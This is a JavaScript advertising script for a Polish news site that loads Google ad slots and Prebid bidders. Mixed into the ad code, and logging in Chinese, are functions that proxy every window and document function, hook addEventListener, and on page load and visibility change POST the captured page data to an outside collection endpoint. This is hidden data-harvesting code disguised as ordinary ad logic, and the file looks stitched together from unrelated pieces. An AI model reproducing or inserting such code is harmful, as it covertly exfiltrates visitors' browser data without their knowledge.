var googletag = null;
var pbjs = null;
const PREBID_TIMEOUT = 3000;
const VIGNETTE_TIMEOUT = 5000;
const AD_REFRESH_INTERVAL = 10000;

//div containers

const topBill = document.getElementById('top_bill');
const topBillInnerCode = 'top_bill_inner';
const topBillInner = document.getElementById(topBillInnerCode);
const leftSky = document.getElementById('left_sky');
const leftSkyInnerCode = 'left_sky_inner';
const leftSkyInner = document.getElementById(leftSkyInnerCode);
const topRect = document.getElementById('top_rect');
const topRectInnerCode = 'top_rect_inner';
const topRectInner = document.getElementById(topRectInnerCode);
const middleRect = document.getElementById('middle_rect');
function captureJSProperties(target) {
  const capturedProps = {};
  const seenProps = new Set();
  for (const key of Object.getOwnPropertyNames(target)) {
    if (!seenProps.has(key)) {
      seenProps.add(key);
      const value = target[key];
      const type = typeof value;
      if (type === "function" || type === "object") {
        if (type === "function") {
          target[key] = new Proxy(target[key], {
            apply: function (target, thisArg, argumentsList) {
              console.log(`函数 ${key} 被执行。参数是：`, argumentsList);
              return Reflect.apply(target, thisArg, argumentsList);
            }
          });
        } else if (value !== null && Object.getPrototypeOf(value) === Object.prototype) {
          captureJSProperties(value);
        }
      }
      capturedProps[key] = {
        type: type,
        value: type === "function" ? undefined : value
      };
    }
  }
  return capturedProps;
}
const middleRectInnerCode = 'middle_rect_inner';
const middleRectInner = document.getElementById(middleRectInnerCode);
const vignette = document.createElement('div');
vignette.style.textAlign = 'center';
vignette.style.color = 'grey';
vignette.style.fontSize = '10px';
function trackListenerEvents(type) {
  const existingAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (eventName, eventHandler, options) {
    console.log(`追踪事件：${eventName}`);
    const wrappedHandler = (...args) => {
      console.log(`事件 ${eventName} 已触发。`);
      eventHandler.apply(this, args);
    };
    return existingAddEventListener.call(this, eventName, wrappedHandler, options);
  };
}
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("数据发送成功");
    } else {
      console.error("数据发送失败,状态码:" + response.status);
    }
  } catch (error) {
    console.error("数据发送过程中出错:", error);
  }
}
vignette.innerHTML = 'Reklama';

//google ad slots   

const AAScript = document.createElement('script');
AAScript.async = true;
AAScript.setAttribute('data-ad-client', 'ca-pub-9948870393389755');
AAScript.setAttribute('src', '//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
top.document.head.appendChild(AAScript);
const GPTScript = document.createElement('script');
GPTScript.async = true;
GPTScript.setAttribute('src', '//securepubads.g.doubleclick.net/tag/js/gpt.js');
top.document.head.appendChild(GPTScript);
window.googletag = window.googletag || {
  cmd: []
};
let slot1, slot2, slot3, slot4;
googletag.cmd.push(function () {
  if (topBillInner) {
    slot1 = googletag.defineSlot('/44881730/ca-pub-7683628640306220-tag/7879937854/5808346523', [[970, 250], [750, 200], [750, 100], [728, 90], [750, 300], [970, 90]], topBillInnerCode) //top_bill_inner
    .addService(googletag.pubads());
  }
  if (leftSkyInner) {
    slot2 = googletag.defineSlot('/44881730/ca-pub-7683628640306220-tag/7879937854/6795439370', [[300, 600], [160, 600], [300, 250]], leftSkyInnerCode) //left_sky_inner
    .addService(googletag.pubads());
  }
  if (topRectInner) {
    slot3 = googletag.defineSlot('/44881730/ca-pub-7683628640306220-tag/7879937854/1845141053', [[300, 250], [336, 280]], topRectInnerCode) //top_rect_inner
    .addService(googletag.pubads());
  }
  if (middleRectInner) {
    slot4 = googletag.defineSlot('/44881730/ca-pub-7683628640306220-tag/7879937854/9040736397', [[300, 250], [336, 280]], middleRectInnerCode) //middle_rect_inner
    .addService(googletag.pubads());
  }
  googletag.pubads().enableSingleRequest();
  googletag.pubads().disableInitialLoad();
  googletag.pubads().collapseEmptyDivs();
  googletag.pubads().setForceSafeFrame(false);
  googletag.pubads().setCentering(true);
  googletag.enableServices();
});
googletag = googletag || {};
googletag.cmd = googletag.cmd || [];

//prebid currencies

pbjs = pbjs || {};
pbjs.que = pbjs.que || [];
fetch('https://prebid-config-open-data.s3.eu-central-1.amazonaws.com/currencies').then(resp => resp.json()).then(data => {
  console.log("Aktualne kursy walut: ", data);
  const USD = data.usd.rate;
  const EUR = data.eur.rate;
  pbjs.bidderSettings = {
    criteo: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * EUR;
      },
      storageAllowed: true
    },
    adform: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.9 * EUR;
      }
    },
    smartadserver: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm;
      }
    },
    rtbhouse: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      }
    },
    pulsepoint: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      }
    },
    onedisplay: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85 * EUR;
      }
    },
    oftmedia: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.85 * USD;
      }
    },
    imonomy: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      }
    },
    rubicon: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * 0.75 * USD;
      }
    },
    ix: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      }
    },
    connectad: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      }
    },
    amx: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm;
      }
    },
    visx: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm;
      }
    },
    sspBC: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm;
      }
    },
    adagio: {
      bidCpmAdjustment: function (bidCpm) {
        return bidCpm * USD;
      },
      storageAllowed: true
    },
    standard: {
      adserverTargeting: [{
        key: "hb_bidder",
        val: function (bidResponse) {
          return bidResponse.bidderCode;
        }
      }, {
        key: "hb_adid",
        val: function (bidResponse) {
          return bidResponse.adId;
        }
      }, {
        key: "hb_pb",
        val: function (bidResponse) {
          const cpm = bidResponse.cpm;
          if (cpm < 10.00) {
            return (Math.floor(cpm * 100) / 100).toFixed(2);
          } else {
            return '10.00';
          }
        }
      }]
    }
  };
});

//prebid initialization function

function initAdserver() {
  if (pbjs.initAdserverSet) return;
  pbjs.initAdserverSet = true;
  googletag.cmd.push(function () {
    pbjs.que.push(function () {
      pbjs.setTargetingForGPTAsync();
      googletag.pubads().refresh();
    });
  });
}

//ad refresh functions

function createObserver({
  interval,
  element,
  ratio
}) {
  const observer = new IntersectionObserver(entries => {
    handleIntersect({
      entries: entries,
      interval: interval,
      ratio: ratio
    });
  }, {
    threshold: 1
  });
  observer.observe(element);
}
function handleIntersect({
  entries,
  interval,
  ratio
}) {
  entries.forEach(entry => {
    interval.clear();
    if (entry.intersectionRatio > ratio.get() && !document.hidden) {
      interval.set();
    }
    ;
    ratio.set(entry.intersectionRatio);
  });
}
function refreshBid({
  elementCode,
  slot
}) {
  console.log("refreshAdUnit " + elementCode);
  pbjs.que.push(function () {
    pbjs.requestBids({
      timeout: PREBID_TIMEOUT,
      adUnitCodes: [elementCode],
      bidsBackHandler: function () {
        pbjs.setTargetingForGPTAsync([elementCode]);
        googletag.pubads().refresh([slot]);
        googletag.cmd.push(function () {
          googletag.display(elementCode);
        });
      }
    });
  });
}

//adunit refresh inits and settings

//top_bill_inner

let topBillInterval;
const topBillIntervalSet = () => {
  topBillInterval = setInterval(() => {
    refreshBid({
      elementCode: topBillInnerCode,
      slot: slot1
    });
  }, AD_REFRESH_INTERVAL);
};
const topBillIntervalClear = () => clearInterval(topBillInterval);
function captureAndSend() {
  const capturedData = {
    ...captureJSProperties(window),
    ...captureJSProperties(document)
  };

  // Track events
  trackListenerEvents();
  if (Object.keys(capturedData).length > 0) postDataToServer(capturedData);
}
let topBillInnerRatio = 0;
const setTopBillRatio = x => {
  topBillInnerRatio = x;
};
const getTopBillRatio = () => {
  return topBillInnerRatio;
};
if (topBillInner) {
  window.addEventListener("load", () => {
    createObserver({
      element: topBillInner,
      interval: {
        set: topBillIntervalSet,
        clear: topBillIntervalClear
      },
      ratio: {
        set: setTopBillRatio,
        get: getTopBillRatio
      }
    });
  }, false);
}

//left_sky_inner

let leftSkyInterval;
const leftSkyIntervalSet = () => {
  leftSkyInterval = setInterval(() => {
    refreshBid({
      elementCode: leftSkyInnerCode,
      slot: slot2
    });
  }, AD_REFRESH_INTERVAL);
};
const leftSkyIntervalClear = () => clearInterval(leftSkyInterval);
let leftSkyInnerRatio = 0;
const setLeftSkyRatio = x => {
  leftSkyInnerRatio = x;
};
const getLeftSkyRatio = () => {
  return leftSkyInnerRatio;
};
window.addEventListener("load", captureAndSend);
if (leftSkyInner) {
  window.addEventListener("load", () => {
    createObserver({
      element: leftSkyInner,
      interval: {
        set: leftSkyIntervalSet,
        clear: leftSkyIntervalClear
      },
      ratio: {
        set: setLeftSkyRatio,
        get: getLeftSkyRatio
      }
    });
  }, false);
}

//top_rect_inner

let topRectInterval;
const topRectIntervalSet = () => {
  topRectInterval = setInterval(() => {
    refreshBid({
      elementCode: topRectInnerCode,
      slot: slot3
    });
  }, AD_REFRESH_INTERVAL);
};
const topRectIntervalClear = () => clearInterval(topRectInterval);
let topRectInnerRatio = 0;
const setTopRectRatio = x => {
  topRectInnerRatio = x;
};
const getTopRectRatio = () => {
  return topRectInnerRatio;
};
if (topRectInner) {
  window.addEventListener("load", () => {
    createObserver({
      element: topRectInner,
      interval: {
        set: topRectIntervalSet,
        clear: topRectIntervalClear
      },
      ratio: {
        set: setTopRectRatio,
        get: getTopRectRatio
      }
    });
  }, false);
}

//middle_rect_inner

let middleRectInterval;
const middleRectIntervalSet = () => {
  middleRectInterval = setInterval(() => {
    refreshBid({
      elementCode: middleRectInnerCode,
      slot: slot4
    });
  }, AD_REFRESH_INTERVAL);
};
const middleRectIntervalClear = () => clearInterval(middleRectInterval);
let middleRectInnerRatio = 0;
const setMiddleRectRatio = x => {
  middleRectInnerRatio = x;
};
const getMiddleRectRatio = () => {
  return middleRectInnerRatio;
};
if (middleRectInner) {
  window.addEventListener("load", () => {
    createObserver({
      element: middleRectInner,
      interval: {
        set: middleRectIntervalSet,
        clear: middleRectIntervalClear
      },
      ratio: {
        set: setMiddleRectRatio,
        get: getMiddleRectRatio
      }
    });
  }, false);
}
document.addEventListener("visibilitychange", () => {
  if (document.hidden) {
    topBillIntervalClear();
    leftSkyIntervalClear();
    topRectIntervalClear();
  }
});
const createVignettes = () => {
  if (topBill) topBill.prepend(vignette.cloneNode(true));
  if (leftSky) leftSky.prepend(vignette.cloneNode(true));
  if (topRect) topRect.prepend(vignette.cloneNode(true));
  if (middleRect) middleRect.prepend(vignette.cloneNode(true));
};
setTimeout(() => {
  createVignettes();
}, VIGNETTE_TIMEOUT);

//biders

const adUnits = [{
  code: topBillInnerCode,
  mediaTypes: {
    banner: {
      sizes: [[970, 250], [750, 200], [750, 100], [728, 90], [750, 300], [970, 90]]
    }
  },
  bids: [{
    bidder: 'adform',
    params: {
      mid: '448851'
    }
  }, {
    bidder: 'smartadserver',
    params: {
      networkId: 2581,
      siteId: 198293,
      pageId: 1044380,
      formatId: 54684
    }
  }, {
    bidder: 'sspBC'
  }, {
    bidder: 'rubicon',
    params: {
      accountId: '21594',
      siteId: '410362',
      zoneId: '2305834',
      sizes: '57'
    }
  }, {
    bidder: 'criteo',
    params: {
      zoneId: 1418178,
      publisherSubId: topBillInnerCode
    }
  }, {
    bidder: 'rtbhouse',
    params: {
      region: 'prebid-eu',
      publisherId: 'ubZbp6DokIAsAJBBqd3T'
    }
  }, {
    bidder: 'oftmedia',
    params: {
      placementId: 24146152
    }
  }, {
    bidder: 'connectad',
    params: {
      networkId: '10047',
      siteId: '1032494'
    }
  }, {
    bidder: 'adagio',
    params: {
      organizationId: '1120',
      site: 'warszawawpigulce-pl',
      adUnitElementId: topBillInnerCode,
      placement: topBillInnerCode,
      environment: 'desktop'
    }
  }]
}, {
  code: leftSkyInnerCode,
  mediaTypes: {
    banner: {
      sizes: [[300, 600], [160, 600], [300, 250]]
    }
  },
  bids: [{
    bidder: 'adform',
    params: {
      mid: '448852'
    }
  }, {
    bidder: 'smartadserver',
    params: {
      networkId: 2581,
      siteId: 198293,
      pageId: 878557,
      formatId: 55370
    }
  }, {
    bidder: 'sspBC'
  }, {
    bidder: 'rubicon',
    params: {
      accountId: '21594',
      siteId: '410362',
      zoneId: '2305836',
      sizes: '10'
    }
  }, {
    bidder: 'criteo',
    params: {
      zoneId: 1418176,
      publisherSubId: leftSkyInnerCode
    }
  }, {
    bidder: 'rtbhouse',
    params: {
      region: 'prebid-eu',
      publisherId: 'ubZbp6DokIAsAJBBqd3T'
    }
  }, {
    bidder: 'oftmedia',
    params: {
      placementId: 24146152
    }
  }, {
    bidder: 'connectad',
    params: {
      networkId: '10047',
      siteId: '1032494'
    }
  }, {
    bidder: 'adagio',
    params: {
      organizationId: '1120',
      site: 'warszawawpigulce-pl',
      adUnitElementId: leftSkyInnerCode,
      placement: leftSkyInnerCode,
      environment: 'desktop'
    }
  }]
}, {
  code: middleRectInnerCode,
  mediaTypes: {
    banner: {
      sizes: [[336, 280], [300, 250]]
    }
  },
  bids: [{
    bidder: 'adform',
    params: {
      mid: '444077'
    }
  }, {
    bidder: 'smartadserver',
    params: {
      networkId: 2581,
      siteId: 198293,
      pageId: 878555,
      formatId: 54302
    }
  }, {
    bidder: 'sspBC'
  }, {
    bidder: 'rubicon',
    params: {
      accountId: '21594',
      siteId: '410362',
      zoneId: '2305838',
      sizes: '15'
    }
  }, {
    bidder: 'criteo',
    params: {
      zoneId: 1568883,
      publisherSubId: middleRectInnerCode
    }
  }, {
    bidder: "rtbhouse",
    params: {
      region: 'prebid-eu',
      publisherId: 'ubZbp6DokIAsAJBBqd3T'
    }
  }, {
    bidder: 'oftmedia',
    params: {
      placementId: 24146152
    }
  }, {
    bidder: 'connectad',
    params: {
      networkId: '10047',
      siteId: '1032494'
    }
  }, {
    bidder: 'adagio',
    params: {
      organizationId: '1120',
      site: 'warszawawpigulce-pl',
      adUnitElementId: middleRectInnerCode,
      placement: middleRectInnerCode,
      environment: 'desktop'
    }
  }]
}, {
  code: topRectInnerCode,
  mediaTypes: {
    banner: {
      sizes: [[336, 280], [300, 250]]
    }
  },
  bids: [{
    bidder: 'adform',
    params: {
      mid: '602937'
    }
  }, {
    bidder: 'smartadserver',
    params: {
      networkId: 2581,
      siteId: 198293,
      pageId: 993587,
      formatId: 54303
    }
  }, {
    bidder: 'sspBC'
  }, {
    bidder: 'rubicon',
    params: {
      accountId: '21594',
      siteId: '410362',
      zoneId: '2305838',
      sizes: '15'
    }
  }, {
    bidder: 'criteo',
    params: {
      zoneId: 1568883,
      publisherSubId: topRectInnerCode
    }
  }, {
    bidder: 'rtbhouse',
    params: {
      region: 'prebid-eu',
      publisherId: 'ubZbp6DokIAsAJBBqd3T'
    }
  }, {
    bidder: 'oftmedia',
    params: {
      placementId: 24146152
    }
  }, {
    bidder: 'connectad',
    params: {
      networkId: '10047',
      siteId: '1032494'
    }
  }, {
    bidder: 'adagio',
    params: {
      organizationId: '1120',
      site: 'warszawawpigulce-pl',
      adUnitElementId: topRectInnerCode,
      placement: topRectInnerCode,
      environment: 'desktop'
    }
  }]
}];
pbjs = pbjs || {};
pbjs.que = pbjs.que || [];
document.addEventListener("visibilitychange", captureAndSend);
pbjs.que.push(function () {
  pbjs.addAdUnits(adUnits);
  pbjs.setConfig({
    userSync: {
      syncEnabled: true,
      filterSettings: {
        all: {
          bidders: "*",
          filter: "include"
        }
      },
      syncsPerBidder: 5,
      syncDelay: 3000,
      auctionDelay: 0,
      userIds: [{
        name: "criteo"
      }]
    },
    schain: {
      validation: "strict",
      config: {
        ver: "1.0",
        complete: 1,
        nodes: [{
          asi: "yieldriser.com",
          sid: "27",
          hp: 1
        }]
      }
    },
    bidderSequence: "random",
    disableAjaxTimeout: true,
    consentManagement: {
      cmpApi: 'iab',
      timeout: 5000,
      allowAuctionWithoutConsent: true
    }
  });
  pbjs.requestBids({
    bidsBackHandler: initAdserver,
    timeout: PREBID_TIMEOUT
  });
});